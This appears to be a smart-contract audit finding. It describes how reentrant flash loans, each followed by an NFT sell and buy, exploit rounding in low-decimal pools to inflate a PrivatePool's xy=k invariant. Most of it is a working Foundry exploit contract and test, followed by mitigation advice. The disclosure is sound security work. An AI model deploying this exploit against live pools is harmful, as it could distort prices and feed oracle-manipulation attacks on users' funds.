# Vulnerability details

## Impact
For pools using `baseToken` with low decimals, traders can significantly increase (e.g. 5x) the `xy=k` invariant.

An example of a legitimate erc20 token with 2 decimals is [Gemini USD](https://etherscan.io/token/0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd?a=0x5f65f7b609678448494De4C87521CdF6cEf1e932).

While this attack isn’t directly profitable, it breaks the main invariant of the protocol by factor of 5 (or more, depending on initial conditions) so I believe it’s medium risk.

Another way to think about the impact is that an attacker can increase price of NFTs (by a larger factor than by simply buying NFTs from the pool) without decreasing the reserves of NFTs in the pool. 

If something else (e.g. a price oracle, or some other contract) relies on reserves and prices provided by the pool, then this attack can be used as a step in a more sophisticated exploit that is actually profitable (e.g. something with oracle manipulation).

## Proof of Concept
Deploy `lowDecimalsToken` (erc20 token with 2 decimals) in `test/Fixture.sol` and add the following test files:

`test/shared/Exploit.sol`
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "openzeppelin/interfaces/IERC3156.sol";

import "../../src/PrivatePool.sol";

contract Exploit is IERC3156FlashBorrower {
    uint256 counter;
    uint256 threshold;

    PrivatePool public lender;
    ERC20 baseToken;
    ERC721 nft;

    uint256 tokenId;

    IStolenNftOracle.Message[] stolenNftProofs;
    uint256[] tokenIds;
    uint256[] tokenWeights;

    PrivatePool.MerkleMultiProof proofs;

    constructor(
        PrivatePool lender_,
        ERC20 baseToken_,
        ERC721 nft_,
        uint256 tokenId_,
        uint256 threshold_
    ) {
        threshold = threshold_;
        lender = lender_;
        nft = nft_;
        baseToken = baseToken_;
        tokenId = tokenId_;
        tokenIds.push(tokenId_);
        baseToken.approve(address(lender_), type(uint256).max);
        ERC721(nft_).setApprovalForAll(address(lender), true);
    }

    function initiateFlashLoan() public {
        lender.flashLoan(this, address(nft), tokenId, "");
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) public override returns (bytes32) {
        counter++;

        if (counter >= threshold) {
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }

        lender.sell(tokenIds, tokenWeights, proofs, stolenNftProofs);
        initiateFlashLoan();
        lender.buy(tokenIds, tokenWeights, proofs);

        counter--;

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```
`test/PrivatePool/PoC.t.sol`

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../Fixture.sol";
import "../shared/Exploit.sol";
import "../../src/PrivatePool.sol";

contract PocTest is Fixture {
    PrivatePool public privatePool;
    Exploit public exploit;

    // erc20 token with 2 decimals
    address baseToken = address(lowDecimalsToken);
    address nft = address(milady);
    uint128 virtualBaseTokenReserves = 100e2;
    uint128 virtualNftReserves = 5e18;
    uint16 feeRate = 0;
    uint56 changeFee = 0;
    bytes32 merkleRoot = bytes32(0);
    address owner = address(this);

    uint256[] tokenIds;
    uint256[] tokenWeights;
    PrivatePool.MerkleMultiProof proofs;
    IStolenNftOracle.Message[] stolenNftProofs;

    function setUp() public {
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );
        privatePool.initialize(
            baseToken,
            nft,
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false
        );

        for (uint256 i = 0; i < 5; i++) {
            milady.mint(address(privatePool), i);
        }

        deal(
            address(lowDecimalsToken),
            address(privatePool),
            virtualBaseTokenReserves
        );
    }

    function test_PoC() public {
        uint256 tokenId = 1;
        uint256 numFlashloanSell = 350;

        exploit = new Exploit(
            privatePool,
            lowDecimalsToken,
            milady,
            tokenId,
            numFlashloanSell
        );
        deal(address(lowDecimalsToken), address(exploit), 1000e2);

        assertEq(privatePool.virtualBaseTokenReserves(), 10_000);
        assertEq(privatePool.virtualNftReserves(), 5e18);
        assertEq(calculateInvariant(), 50_000e18);

        exploit.initiateFlashLoan();
        exploit.initiateFlashLoan();
        exploit.initiateFlashLoan();

        assertEq(privatePool.virtualBaseTokenReserves(), 48_138);
        assertEq(privatePool.virtualNftReserves(), 5e18);
        assertEq(calculateInvariant(), 240_690e18);
    }

    function calculateInvariant() public returns (uint256) {
        return
            privatePool.virtualBaseTokenReserves() *
            privatePool.virtualNftReserves();
    }
}
```

The main idea of the attack is to `flashLoan` an NFT and then immediately sell it back to the pool. Then `flashLoan` the same NFT again (it’s back in the pool) and repeat this process many times.

The number of times this can be repeated is limited by EVMs call stack depth limit of 1024.

This increases `virtualNftReserves` and decreases `virtualBaseTokenReserves` more than would normally be possible.

If `baseToken` has low decimals, then we can reach the point where `virtualNftReserves` are of the same order of magnitude as `1e18 * virtualBaseTokenReserves` and we start getting rounding errors in `sellQuote` and `buyQuote` because of it.

The formulas in `sellQuote` and `buyQuote` no longer preserve the `xy=k` invariant when the rounding errors become significant.

Then we buy the NFT and repay the `flashLoan` repeatedly.

If there are NFTs with different weights in the pool, then the attack can be made more effective by repeating `flashLoan`, `sell` for the NFT with the highest weight.


## Tools Used
Foundry

## Recommended Mitigation Steps
Consider using reentrancy guard in the `flashLoan` function.

Alternatively, add checks that revert when `virtualBaseTokenReserves / virtualNftReserves` is no longer within the range in which rounding errors are acceptable.

